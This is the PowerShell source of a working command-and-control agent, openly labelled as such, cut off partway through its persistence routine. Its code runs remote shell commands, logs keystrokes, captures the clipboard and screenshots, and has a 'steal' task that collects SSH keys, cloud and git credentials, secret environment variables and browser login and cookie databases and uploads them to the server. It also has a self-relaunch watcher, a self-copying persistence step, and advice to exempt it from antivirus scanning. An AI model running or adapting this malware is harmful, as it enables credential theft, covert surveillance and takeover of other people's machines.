<#
.C2 agent — PowerShell port (Windows PowerShell 5.1+).

Port of clients/agent.py with identical CLI flags, task types and result
shapes. Wire protocol documented in C2/protocol.md. Also runs under pwsh on
Linux/macOS, with platform-specific behaviour where noted.

Usage:
    powershell -NoProfile -ExecutionPolicy Bypass -File agent.ps1 ^
        --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
    powershell -NoProfile -ExecutionPolicy Bypass -File agent.ps1 ^
        --server http://127.0.0.1:8000 --token <AGENT_TOKEN> ^
        --interval 5 --jitter 2 --verbose
    PowerShell-style names also work: -Server ... -Token ... -Interval ...
    -Jitter ... -State ... -Verbose.

Environment variables (accepted when the flag is not given):
    C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE

Flags:
    --server URL      server base URL (required unless C2_SERVER is set)
    --token TOKEN     shared agent token (required unless C2_TOKEN is set)
    --interval N      heartbeat interval in seconds (default 10, min 1)
    --jitter N        random jitter in seconds added to the interval
    --state FILE      state file persisting the agent id (default ~/.c2agent.json)
    --verbose         print activity to stdout
    -h, --help        show this help and exit

Only use against systems you own or are authorized to test.

AMSI note: a full-fidelity PowerShell C2 agent (persistence, keystroke logging,
credential collection, lateral movement) is intrinsically flagged by Windows
Defender/AMSI script heuristics — this project does not obfuscate or evade.
When trialling on your own host, exclude the directory from real-time scanning
for the duration of the authorized test.
#>

$ErrorActionPreference = 'Continue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}

Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue

$Script:ThisScript = $MyInvocation.MyCommand.Path
if (-not $Script:ThisScript) { $Script:ThisScript = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'c2agent.ps1' }

# ----------------------------------------------------------------------
# Command-line parsing (accepts both --name value and -Name value, the = form,
# the PowerShell -Name=value form, and tokens that start with a dash).
# ----------------------------------------------------------------------
$Script:ScriptServer = ''
$Script:ScriptToken  = ''
$Script:ScriptInterval = $null
$Script:ScriptJitter = $null
$Script:ScriptState  = ''
$Script:ScriptVerbose = $false
$Script:KeepLooping  = $true
$Script:AgentId      = $null

function Set-Option([string]$name, [string]$value) {
    switch ($name) {
        'server'   { $Script:ScriptServer = $value }
        'token'    { $Script:ScriptToken = $value }
        'interval' { try { $Script:ScriptInterval = [math]::Max(1, [int]$value) } catch {} }
        'jitter'   { try { $Script:ScriptJitter = [math]::Max(0.0, [double]$value) } catch {} }
        'state'    { $Script:ScriptState = $value }
        'verbose'  { $Script:ScriptVerbose = $true }
    }
}

$optNames = @('server', 'token', 'interval', 'jitter', 'state', 'verbose')
$i = 0
while ($i -lt $args.Count) {
    $a = $args[$i]
    if ($a -match '^--?(?:[^=]+)=(.*)$') {
        $nm = ($a -split '=')[0].TrimStart('-')
        Set-Option $nm.ToLower() $Matches[1]
    }
    elseif ($a -match '^-{1,2}([a-zA-Z]+)$') {
        $nm = $Matches[1].ToLower()
        if ($nm -eq 'help') {
            Write-Output 'usage: powershell agent.ps1 --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]'
            Write-Output ''
            Write-Output 'Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):'
            Write-Output '  --server URL      server base URL (required unless C2_SERVER is set)'
            Write-Output '  --token TOKEN     shared agent token (required unless C2_TOKEN is set)'
            Write-Output '  --interval N      heartbeat interval in seconds (default 10, min 1)'
            Write-Output '  --jitter N        random jitter in seconds added to the interval'
            Write-Output '  --state FILE      state file persisting the agent id (default ~/.c2agent.json)'
            Write-Output '  --verbose         print activity to stdout'
            Write-Output '  -h, --help        show this help and exit'
            exit 0
        }
        elseif ($nm -eq 'verbose') {
            $Script:ScriptVerbose = $true
        }
        elseif ($nm -in $optNames) {
            if ($i + 1 -ge $args.Count) {
                Write-Warning "option $a requires a value"
                exit 2
            }
            $i++
            Set-Option $nm $args[$i]
        }
        else {
            Write-Warning "unknown option: $a"
            exit 2
        }
    }
    $i++
}

if (-not $Script:ScriptServer) { $Script:ScriptServer = $env:C2_SERVER }
if (-not $Script:ScriptToken)  { $Script:ScriptToken = $env:C2_TOKEN }
if ($null -eq $Script:ScriptInterval) {
    if ($env:C2_INTERVAL) {
        try { $Script:ScriptInterval = [math]::Max(1, [int]$env:C2_INTERVAL) } catch {}
    }
    if ($null -eq $Script:ScriptInterval) { $Script:ScriptInterval = 10 }
}
if ($null -eq $Script:ScriptJitter) {
    if ($env:C2_JITTER) {
        try { $Script:ScriptJitter = [math]::Max(0.0, [double]$env:C2_JITTER) } catch {}
    }
    if ($null -eq $Script:ScriptJitter) { $Script:ScriptJitter = 0.0 }
}
if (-not $Script:ScriptState) {
    if ($env:C2_STATE_FILE) { $Script:ScriptState = $env:C2_STATE_FILE }
    else { $Script:ScriptState = Join-Path ([Environment]::GetFolderPath('UserProfile')) '.c2agent.json' }
}
if ($env:C2_VERBOSE -eq '1' -or $env:C2_VERBOSE -eq 'true') { $Script:ScriptVerbose = $true }

if (-not $Script:ScriptServer -or -not $Script:ScriptToken) {
    Write-Warning 'agent.ps1: --server and --token are required (or C2_SERVER/C2_TOKEN)'
    exit 2
}

$Server  = $Script:ScriptServer.TrimEnd('/')
$Token   = $Script:ScriptToken
$Script:RuntimeInterval = [int]$Script:ScriptInterval
$Script:RuntimeJitter   = [double]$Script:ScriptJitter
$StateFile = $Script:ScriptState

$OutputLimit = 12000
$KeylogDumpLimit = 8000
$ShellTimeout = 120

# ----------------------------------------------------------------------
# Small helpers
# ----------------------------------------------------------------------
function Log([string]$msg) {
    if ($Script:ScriptVerbose) { Write-Host "[*] $msg" -ForegroundColor DarkGray }
}

function Transform-Output([string]$text, [int]$limit = $OutputLimit) {
    if ($null -eq $text) { return '' }
    $s = $text.ToString()
    if ($s.Length -le $limit) { return $s }
    $head = [int]($limit / 5)
    $tail = $limit - $head - 20
    return $s.Substring(0, $head) +
        "`n... [$($s.Length - $head - $tail) chars truncated] ...`n" +
        $s.Substring($s.Length - $tail)
}

function Test-WindowsRt {
    if ($PSVersionTable.PSEdition -eq 'Core') { return $IsWindows }
    return $env:OS -like 'Windows*'
}

function Get-LocalIp {
    $sock = [System.Net.Sockets.Socket]::new(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Dgram,
        [System.Net.Sockets.ProtocolType]::Udp)
    try {
        $sock.Connect('8.8.8.8', 80)
        return $sock.LocalEndPoint.Address.ToString()
    } catch { return '' }
    finally { $sock.Dispose() }
}

function Get-ShortString([object]$v) {
    if ($null -eq $v) { return '' }
    return $v.ToString()
}

# ----------------------------------------------------------------------
# State (persist the agent id)
# ----------------------------------------------------------------------
function Save-State {
    try {
        $dir = Split-Path $StateFile -Parent
        if ($dir -and -not (Test-Path -LiteralPath $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
        @{ agent_id = $Script:AgentId } | ConvertTo-Json -Compress | Set-Content -LiteralPath $StateFile -Encoding UTF8
    } catch { Log "state save failed: $_" }
}

function Load-State {
    try {
        if (Test-Path -LiteralPath $StateFile) {
            $j = Get-Content -LiteralPath $StateFile -Raw | ConvertFrom-Json
            return $j.agent_id
        }
    } catch {}
    return $null
}

# ----------------------------------------------------------------------
# HTTP client (shared session)
# ----------------------------------------------------------------------
$Http = [System.Net.Http.HttpClient]::new()
$Http.Timeout = [TimeSpan]::FromSeconds(120)
$Http.DefaultRequestHeaders.Add('X-Agent-Token', $Token)

function New-JsonBody([object]$obj) {
    return [System.Net.Http.StringContent]::new(
        ($obj | ConvertTo-Json -Compress -Depth 12),
        [System.Text.Encoding]::UTF8,
        'application/json')
}

function Post-Json([string]$url, [object]$body) {
    $resp = $Http.PostAsync($url, (New-JsonBody $body)).GetAwaiter().GetResult()
    return $resp
}

function Read-ResponseBody($resp) {
    return ($resp.Content.ReadAsStringAsync().GetAwaiter().GetResult())
}

function Is-NotFound($resp) {
    return ($resp.StatusCode -eq [System.Net.HttpStatusCode]::NotFound)
}

function Is-Success($resp) {
    return ($resp.StatusCode -eq [System.Net.HttpStatusCode]::OK)
}

# ----------------------------------------------------------------------
# Lifecycle: register / checkin
# ----------------------------------------------------------------------
function Register-Agent {
    $os = if (Test-WindowsRt) { 'windows' }
          elseif (Test-Path '/etc/os-release') { 'linux' }
          elseif (Test-Path '/Library') { 'macos' }
          else { 'unknown' }
    $arch = $env:PROCESSOR_ARCHITECTURE
    if (-not $arch) { $arch = (Get-ShortString (& uname -m 2>$null)).Trim() }
    $body = @{
        agent_id = $Script:AgentId
        hostname = if ($env:COMPUTERNAME) { $env:COMPUTERNAME } else { [System.Net.Dns]::GetHostName() }
        username = if ($env:USERNAME) { $env:USERNAME } else { [Environment]::UserName }
        os = $os
        arch = $arch
        pid = $PID
        ip = Get-LocalIp
        version = '1.0'
        type = 'PowerShell'
    }
    Log "registering with $Server"
    $resp = Post-Json "$Server/api/register" $body
    $resp.EnsureSuccessStatusCode()
    $j = Read-ResponseBody $resp | ConvertFrom-Json
    $Script:AgentId = $j.agent_id
    Save-State
    Log "agent id: $Script:AgentId"
}

function Get-Tasks {
    $resp = Post-Json "$Server/api/checkin" @{ agent_id = $Script:AgentId }
    if (Is-NotFound $resp) {
        Log 'server does not know us - re-registering'
        Register-Agent
        return @()
    }
    $resp.EnsureSuccessStatusCode()
    $j = Read-ResponseBody $resp | ConvertFrom-Json
    if ($null -eq $j.tasks) { return @() }
    return @($j.tasks)
}

function Send-Result([string]$taskId, [hashtable]$result) {
    $body = @{
        agent_id = $Script:AgentId
        task_id = $taskId
        output = Transform-Output (Get-ShortString $result.output)
        exit_code = [int]$result.exit_code
        error = (Get-ShortString $result.error)
    }
    try {
        $resp = Post-Json "$Server/api/result" $body
        $null = $resp
    } catch { Log "failed to report result: $_" }
}

# ----------------------------------------------------------------------
# Task: shell
# ----------------------------------------------------------------------
function Invoke-ShellTask([object]$argsMap) {
    $cmd = Get-ShortString $argsMap.command
    $timeoutSec = $ShellTimeout
    try { $timeoutSec = [math]::Max(1, [math]::Min([int]$argsMap.timeout, 3600)) } catch {}
    Log "executing: $cmd"
    $psi = [System.Diagnostics.ProcessStartInfo]::new()
    $psi.FileName = 'cmd.exe'
    $psi.Arguments = '/d /s /c "' + $cmd + '"'
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    try {
        $p = [System.Diagnostics.Process]::new()
        $p.StartInfo = $psi
        [void]$p.Start()
        $timedOut = -not $p.WaitForExit($timeoutSec * 1000)
        if ($timedOut) {
            try { $p.Kill(); $p.WaitForExit() } catch {}
            $out = $p.StandardOutput.ReadToEnd() + $p.StandardError.ReadToEnd()
            return @{ output = Transform-Output "command timed out (${timeoutSec}s)`n$out"; exit_code = 124; error = '' }
        }
        $out = $p.StandardOutput.ReadToEnd() + $p.StandardError.ReadToEnd()
        return @{ output = Transform-Output $out; exit_code = $p.ExitCode; error = '' }
    } catch {
        return @{ output = Transform-Output "error: $_"; exit_code = 1; error = "$_" }
    }
}

# ----------------------------------------------------------------------
# Task: download / upload
# ----------------------------------------------------------------------
function Invoke-DownloadTask([string]$taskId, [object]$argsMap) {
    $fname = Get-ShortString $argsMap.file
    if (-not $fname) { $fname = 'payload.bin' }
    $dest = Get-ShortString $argsMap.destination
    if (-not $dest) { $dest = $fname }
    Log "downloading $fname to $dest"
    try {
        if (Test-Path -LiteralPath $dest -PathType Container) {
            $dest = Join-Path $dest $fname
        }
        elseif ($dest.EndsWith('\') -or $dest.EndsWith('/')) {
            $dest = Join-Path $dest $fname
        }
        $parent = Split-Path $dest -Parent
        if ($parent -and -not (Test-Path -LiteralPath $parent)) {
            New-Item -ItemType Directory -Path $parent -Force | Out-Null
        }
        $resp = $Http.GetAsync("$Server/api/files/$taskId").GetAwaiter().GetResult()
        $resp.EnsureSuccessStatusCode()
        $bytes = $resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult()
        [System.IO.File]::WriteAllBytes($dest, $bytes)
        return @{ output = "saved $($bytes.Length) bytes to $dest"; exit_code = 0; error = '' }
    } catch {
        return @{ output = "download error: $_"; exit_code = 1; error = "$_" }
    }
}

function Send-FileUpload([string]$taskId, [string]$path, [string]$filename, [string]$mime) {
    $mp = [System.Net.Http.MultipartFormDataContent]::new()
    $fs = [System.IO.FileStream]::new($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
    $sc = [System.Net.Http.StreamContent]::new($fs)
    try {
        $sc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new($mime)
        $mp.Add($sc, 'file', $filename)
        $resp = $Http.PostAsync("$Server/api/files/$taskId", $mp).GetAwaiter().GetResult()
        return [int]$resp.StatusCode
    } finally {
        $sc.Dispose()
        $fs.Dispose()
        $mp.Dispose()
    }
}

function Invoke-UploadTask([string]$taskId, [object]$argsMap) {
    $path = Get-ShortString $argsMap.path
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
        return @{ output = "file not found: $path"; exit_code = 1; error = '' }
    }
    Log "uploading $path"
    try {
        $code = Send-FileUpload $taskId $path (Split-Path $path -Leaf) 'application/octet-stream'
        if ($code -ne 200) {
            return @{ output = "upload failed: HTTP $code"; exit_code = 1; error = '' }
        }
        return @{ output = "uploaded $path"; exit_code = 0; error = '' }
    } catch {
        return @{ output = "upload error: $_"; exit_code = 1; error = "$_" }
    }
}

# ----------------------------------------------------------------------
# Task: sleep / exit
# ----------------------------------------------------------------------
function Invoke-SleepTask([object]$argsMap) {
    try { $Script:RuntimeInterval = [math]::Max(1, [int]$argsMap.seconds) } catch {}
    return @{ output = "heartbeat interval set to $($Script:RuntimeInterval)s"; exit_code = 0; error = '' }
}

# ----------------------------------------------------------------------
# Task: keylog (Windows: GetAsyncKeyState polling timer; Unix: unsupported)
# ----------------------------------------------------------------------
$Script:Klog = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
$Script:KlogTimer = $null
$Script:KlogState = @{}

try {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class C2KeysNative
{
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
'@ -ErrorAction SilentlyContinue
} catch {}

function Start-Keylogger {
    if (Test-WindowsRt -eq $false) {
        return 'error: keylogger not supported on non-Windows PowerShell'
    }
    if ($null -ne $Script:KlogTimer) { return 'keylogger already running' }
    try { [void][C2KeysNative] } catch {
        return 'error: could not load native key API'
    }
    $map = @{}
    $map[0x08] = 'BACKSPACE'; $map[0x09] = 'TAB'; $map[0x0D] = 'ENTER'
    $map[0x1B] = 'ESC'; $map[0x20] = 'SPACE'; $map[0x2D] = 'INS'
    $map[0x2E] = 'DEL'; $map[0x24] = 'HOME'; $map[0x23] = 'END'
    $map[0x21] = 'PGUP'; $map[0x22] = 'PGDN'
    $map[0x25] = 'LEFT'; $map[0x26] = 'UP'; $map[0x27] = 'RIGHT'; $map[0x28] = 'DOWN'
    foreach ($k in 0x41..0x5A) { $map[$k] = [char]$k }
    foreach ($k in 0x30..0x39) { $map[$k] = [char]$k }
    foreach ($k in 0x70..0x7B) { $map[$k] = 'F' + ($k - 0x6F) }
    $Script:KlogState = @{}
    $cb = {
        $map = $args[0]
        $state = $Script:KlogState
        foreach ($vk in $map.Keys) {
            $pressed = ([C2KeysNative]::GetAsyncKeyState([int]$vk) -lt 0)
            $wasDown = $state.ContainsKey([int]$vk) -and $state[[int]$vk]
            if ($pressed -and -not $wasDown) {
                $label = [string]$map[$vk]
                $Script:Klog.Enqueue($label)
            }
            $state[[int]$vk] = $pressed
        }
        while ($Script:Klog.Count -gt $KeylogDumpLimit) {
            $tmp = 0
            $null = $Script:Klog.TryDequeue([ref]$tmp)
        }
    }
    $timer = [System.Threading.Timer]::new(
        [System.Threading.TimerCallback]$cb, $map, 0, 80)
    $Script:KlogTimer = $timer
    return 'keylogger started'
}

function Stop-Keylogger {
    if ($null -eq $Script:KlogTimer) { return 'keylogger not running' }
    $Script:KlogTimer.Dispose()
    $Script:KlogTimer = $null
    return 'keylogger stopped'
}

function Dump-Keylogger {
    $text = ($Script:Klog.ToArray()) -join ''
    if (-not $text) { return '(no keystrokes recorded)' }
    if ($text.Length -gt $KeylogDumpLimit) {
        $text = $text.Substring($text.Length - $KeylogDumpLimit)
    }
    return $text
}

function Invoke-KeylogTask([object]$argsMap) {
    $action = (Get-ShortString $argsMap.action).ToLower()
    if (-not $action) { $action = 'dump' }
    switch ($action) {
        'start' { $out = Start-Keylogger }
        'stop'  { $out = Stop-Keylogger }
        default { $out = Dump-Keylogger }
    }
    return @{ output = $out; exit_code = 0; error = '' }
}

# ----------------------------------------------------------------------
# Task: clipboard
# ----------------------------------------------------------------------
function Invoke-ClipboardTask([object]$argsMap) {
    $action = (Get-ShortString $argsMap.action).ToLower()
    if ($action -eq 'set') {
        try {
            Set-Clipboard -Value (Get-ShortString $argsMap.text)
            return @{ output = 'clipboard set'; exit_code = 0; error = '' }
        } catch {
            return @{ output = "error: $_"; exit_code = 1; error = "$_" }
        }
    }
    try {
        $text = Get-Clipboard -Raw -ErrorAction Stop
        if ($null -eq $text) { $text = '' }
        return @{ output = "$text"; exit_code = 0; error = '' }
    } catch {
        return @{ output = "error: $_"; exit_code = 1; error = "$_" }
    }
}

# ----------------------------------------------------------------------
# Task: screenshot
# ----------------------------------------------------------------------
function Invoke-ScreenshotTask([string]$taskId, [object]$argsMap) {
    $name = (Get-ShortString $argsMap.name).Trim()
    if (-not $name) { $name = 'screenshot' }
    $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ('c2shot_' + [guid]::NewGuid().ToString('N') + '.png')
    try {
        $ok = $false
        if (Test-WindowsRt) {
            Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
            Add-Type -AssemblyName System.Drawing -ErrorAction Stop
            $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bmp = [System.Drawing.Bitmap]::new($b.Width, $b.Height)
            try {
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
                $g.Dispose()
                $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Png)
                $ok = $true
            } finally { $bmp.Dispose() }
        }
        else {
            foreach ($tool in @(@('import', '-window', 'root', $tmp),
                                 @('scrot', $tmp),
                                 @('gnome-screenshot', '-f', $tmp))) {
                & $tool[0] @($tool[1..($tool.Count - 1)]) 2>$null
                if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $tmp)) { $ok = $true; break }
            }
        }
        if (-not $ok -or (-not (Test-Path -LiteralPath $tmp))) {
            return @{ output = 'error: screenshot failed (no tool available)'; exit_code = 1; error = '' }
        }
        if ((Get-Item -LiteralPath $tmp).Length -eq 0) {
            Remove-Item -LiteralPath $tmp -Force
            return @{ output = 'error: screenshot failed (empty image)'; exit_code = 1; error = '' }
        }
        $code = Send-FileUpload $taskId $tmp ($name + '.png') 'image/png'
        Remove-Item -LiteralPath $tmp -Force
        if ($code -ne 200) {
            return @{ output = "screenshot upload failed: HTTP $code"; exit_code = 1; error = '' }
        }
        return @{ output = "screenshot saved ($name.png)"; exit_code = 0; error = '' }
    } catch {
        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force }
        return @{ output = "error: $_"; exit_code = 1; error = "$_" }
    }
}

# ----------------------------------------------------------------------
# Task: steal
# ----------------------------------------------------------------------
$StealKeywords = @(
    'token', 'secret', 'password', 'passwd', 'key=', 'api', 'auth',
    'aws', 'azure', 'google', 'github', 'gitlab', 'slack', 'discord',
    'cookie', 'session', 'credential', 'access', 'proxy', 'login')
$StealTokenFiles = @(
    '.aws/credentials', '.aws/config',
    '.git-credentials', '.netrc', '.npmrc', '.pypirc',
    '.pip/pip.conf', '.config/pip/pip.conf',
    '.config/gh/hosts.yml', '.config/rclone/rclone.conf',
    '.config/gcloud/credentials.json', '.config/gcloud/access_tokens.db',
    '.docker/config.json', '.kube/config',
    '.ssh/id_rsa', '.ssh/id_ed25519', '.ssh/id_ecdsa', '.ssh/config',
    '.ssh/known_hosts', '.ssh/authorized_keys')
$StealMaxFile = 8MB
$ChromiumProfileFiles = @('Login Data', 'Cookies', 'Web Data')
$FirefoxProfileFiles = @('cookies.sqlite', 'logins.json', 'key4.db', 'cert9.db')

function Copy-StealFile([string]$src, [string]$dstDir) {
    try {
        if (-not (Test-Path -LiteralPath $src -PathType Leaf)) { return $false }
        if ((Get-Item -LiteralPath $src).Length -gt $StealMaxFile) { return $false }
        if (-not (Test-Path -LiteralPath $dstDir)) { New-Item -ItemType Directory -Path $dstDir -Force | Out-Null }
        Copy-Item -LiteralPath $src -Destination $dstDir -Force
        return $true
    } catch { return $false }
}

function Steal-Env([string]$work) {
    $lines = New-Object System.Collections.Generic.List[string]
    Get-ChildItem Env: | ForEach-Object {
        $low = $_.Name.ToLower()
        foreach ($kw in $StealKeywords) {
            if ($low.Contains($kw)) { $lines.Add("$($_.Name)=$($_.Value)"); break }
        }
    }
    if ($lines.Count -eq 0) { return @() }
    $path = Join-Path $work 'env.txt'
    $lines | Sort-Object | Set-Content -LiteralPath $path -Encoding UTF8
    return @('env.txt')
}

function Steal-Tokens([string]$work) {
    $home = [Environment]::GetFolderPath('UserProfile')
    $hits = @()
    $dstDir = Join-Path $work 'tokens'
    foreach ($rel in $StealTokenFiles) {
        $src = Join-Path $home $rel
        if (Copy-StealFile $src $dstDir) { $hits += "tokens/$([IO.Path]::GetFileName($rel))" }
    }
    return $hits
}

function Get-BrowserRoots {
    $roots = @{}
    $home = [Environment]::GetFolderPath('UserProfile')
    if (Test-WindowsRt) {
        $la = $env:LOCALAPPDATA; $appd = $env:APPDATA
        foreach ($rel in @('Google/Chrome/User Data', 'Microsoft/Edge/User Data',
                           'BraveSoftware/Brave-Browser/User Data',
                           'Opera Software/Opera Stable')) {
            if ($la) { $roots[(Join-Path $la $rel)] = 'chromium' }
        }
        if ($appd) { $roots[(Join-Path $appd 'Mozilla/Firefox/Profiles')] = 'firefox' }
    }
    else {
        foreach ($rel in @('google-chrome', 'chromium', 'microsoft-edge', 'msedge',
                           'brave-browser', 'brave', 'opera')) {
            $roots[(Join-Path $home ".config/$rel")] = 'chromium'
        }
        $roots[(Join-Path $home '.mozilla/firefox')] = 'firefox'
    }
    return $roots
}

function Steal-Browser([string]$work) {
    $hits = @()
    foreach ($root in (Get-BrowserRoots).GetEnumerator()) {
        if (-not (Test-Path -LiteralPath $root.Key -PathType Container)) { continue }
        $kind = $root.Value
        $targets = if ($kind -eq 'firefox') { $FirefoxProfileFiles } else { $ChromiumProfileFiles }
        Get-ChildItem -LiteralPath $root.Key -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Name -in $targets) {
                $rel = $_.FullName.Substring($root.Key.Length).TrimStart('\', '/')
                $flat = $rel -replace '[\\/]', '__'
                $dst = Join-Path $work "browser\$kind\$flat"
                if (Copy-StealFile $_.FullName $dst) { $hits += "browser/$kind/$flat" }
            }
        }
    }
    return $hits
}

function Invoke-StealTask([string]$taskId, [object]$argsMap) {
    $profile = (Get-ShortString $argsMap.profile).ToLower()
    if ($profile -notin @('all', 'env', 'tokens', 'browser')) { $profile = 'all' }
    $work = Join-Path ([System.IO.Path]::GetTempPath()) ('c2steal_' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $work -Force | Out-Null
    $archive = $null
    $manifest = New-Object System.Collections.Generic.List[string]
    try {
        if ($profile -in @('all', 'env')) {
            Log 'steal: collecting env vars'
            foreach ($h in (Steal-Env $work)) { $manifest.Add($h) }
        }
        if ($profile -in @('all', 'tokens')) {
            Log 'steal: collecting token files'
            foreach ($h in (Steal-Tokens $work)) { $manifest.Add($h) }
        }
        if ($profile -in @('all', 'browser')) {
            Log 'steal: collecting browser dbs'
            foreach ($h in (Steal-Browser $work)) { $manifest.Add($h) }
        }
        if ($manifest.Count -eq 0) {
            return @{ output = "steal ($profile): nothing found"; exit_code = 1; error = '' }
        }
        $listing = $manifest | Sort-Object | ForEach-Object { ($_.ToString()) }
        $listing | Set-Content -LiteralPath (Join-Path $work 'manifest.txt') -Encoding UTF8
        $archive = Join-Path ([System.IO.Path]::GetTempPath()) ('c2steal_zip_' + [guid]::NewGuid().ToString('N') + '.zip')
        Compress-Archive -Path (Join-Path $work '*') -DestinationPath $archive -Force
        $size = (Get-Item -LiteralPath $archive).Length
        $code = Send-FileUpload $taskId $archive 'steal.zip' 'application/zip'
        if ($code -ne 200) {
            return @{ output = "steal upload failed: HTTP $code"; exit_code = 1; error = '' }
        }
        $out = "stole $($manifest.Count) item(s) -> steal.zip ($size bytes)`n" + ($listing -join "`n")
        return @{ output = Transform-Output $out 4000; exit_code = 0; error = '' }
    } catch {
        return @{ output = "error: $_"; exit_code = 1; error = "$_" }
    } finally {
        if (Test-Path -LiteralPath $archive) { Remove-Item -LiteralPath $archive -Force -ErrorAction SilentlyContinue }
        Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# ----------------------------------------------------------------------
# Task: clone - watcher that relaunches a dead/stale target agent
# (background job per target; Start-Job keeps it isolated and stoppable)
# ----------------------------------------------------------------------
$CloneJobs = @{}

function Invoke-CloneTask([object]$argsMap) {
    $action = (Get-ShortString $argsMap.action).ToLower()
    if (-not $action) { $action = 'start' }
    $target = (Get-ShortString $argsMap.target).Trim()
    if (-not $target) { $target = $Script:AgentId }
    $command = (Get-ShortString $argsMap.command).Trim()

    if ($action -eq 'stop') {
        if (-not $CloneJobs.ContainsKey($target)) {
            return @{ output = "clone: no watcher for $target"; exit_code = 1; error = '' }
        }
        $job = $CloneJobs[$target]
        Stop-Job -Job $job -ErrorAction SilentlyContinue
        Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
        $null = $CloneJobs.Remove($target)
        return @{ output = "clone: watcher for $target stopped"; exit_code = 0; error = '' }
    }

    if ($action -eq 'status') {
        if ($CloneJobs.Count -eq 0) {
            return @{ output = 'clone: no watchers running'; exit_code = 0; error = '' }
        }
        $lines = @()
        foreach ($tid in $CloneJobs.Keys) {
            $job = $CloneJobs[$tid]
            $state = [string]$job.State
            $lastLine = ''
            $received = Receive-Job -Job $job -Keep -ErrorAction SilentlyContinue
            if ($received) { $lastLine = ($received | Select-Object -Last 1) -as [string] }
            $lines += "  ${tid}: job $state | $lastLine"
        }
        return @{ output = ('clone watchers:' + "`n" + ($lines -join "`n")); exit_code = 0; error = '' }
    }

    # start
    if ($CloneJobs.ContainsKey($target)) {
        return @{ output = "clone: watcher for $target already running"; exit_code = 1; error = '' }
    }
    if (-not $command) {
        return @{ output = "clone: 'command' (relaunch cmd) required"; exit_code = 1; error = '' }
    }
    $iv = 30
    try { $iv = [math]::Max(5, [math]::Min([int]$argsMap.interval, 3600)) } catch {}
    $job = Start-Job -ScriptBlock {
        param($t, $cmd, $ivSec, $srv, $tok)
        Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
        $c = [System.Net.Http.HttpClient]::new()
        $c.Timeout = [TimeSpan]::FromSeconds(30)
        $c.DefaultRequestHeaders.Add('X-Agent-Token', $tok)
        $srv = $srv.TrimEnd('/')
        $last = $null
        while ($true) {
            try {
                $resp = $c.GetAsync("$srv/api/clone/status/$t").GetAwaiter().GetResult()
                if ($resp.StatusCode -eq [System.Net.HttpStatusCode]::NotFound) {
                    Write-Output "STATUS $t unknown (target gone)"
                }
                elseif ($resp.StatusCode -eq [System.Net.HttpStatusCode]::OK) {
                    $j = ($resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()) | ConvertFrom-Json
                    $st = if ($j.status) { $j.status } else { 'unknown' }
                    Write-Output "STATUS $t $st last_seen=$($j.last_seen)"
                    if (($st -eq 'dead' -or $st -eq 'stale') -and $cmd) {
                        Write-Output "RELAUNCH $t cmd=$cmd"
                        try {
                            Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', $cmd `
                                -WindowStyle Hidden | Out-Null
                        } catch { Write-Output "RELAUNCH $t FAILED $_" }
                    }
                }
                else {
                    Write-Output "STATUS $t http $([int]$resp.StatusCode)"
                }
            } catch {
                Write-Output "STATUS $t error $_"
            }
            Start-Sleep -Seconds $ivSec
        }
    } -ArgumentList $target, $command, $iv, $Server, $Token -Name $target
    $CloneJobs[$target] = $job
    return @{
        output = "clone: watcher started on target $target (every ${iv}s, restart cmd: $command)"
        exit_code = 0; error = ''
    }
}

# ----------------------------------------------------------------------
# Task: persistence
# ----------------------------------------------------------------------
function Invoke-PersistenceTask([object]$argsMap) {
    try {
        if (Test-WindowsRt) { return Persist-Windows }
        return Persist-Unix
    } catch {
        return @{ output = "persistence error: $_"; exit_code = 1; error = "$_" }
    }
}

function Get-RelaunchCmd([string]$scriptPath) {
    $launch = "powershell -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    return "$launch --server $Server --token $Token --interval $($Script:RuntimeInterval) --jitter $($Script:RuntimeJitter)"
}

function Persist-Windows {
    $base = if ($env:APPDATA) { $env:APPDATA } else { [Environment]::GetFolderPath('UserProfile') }
    $drop = Join-Path $base 'Microsoft\Windows\c2update'
    New-Item -ItemType Directory -Path $drop -Force | Out-Null
    $lines = @()
    $code = 0
    try {
        $dest = Join-Path $drop 'c2agent.ps1'
        Copy-Item -LiteralPath $Script:ThisScript -Destination $dest -Force
        $relaunch = Get-RelaunchCmd $dest
        $lines += "persistence: copied self to $dest"
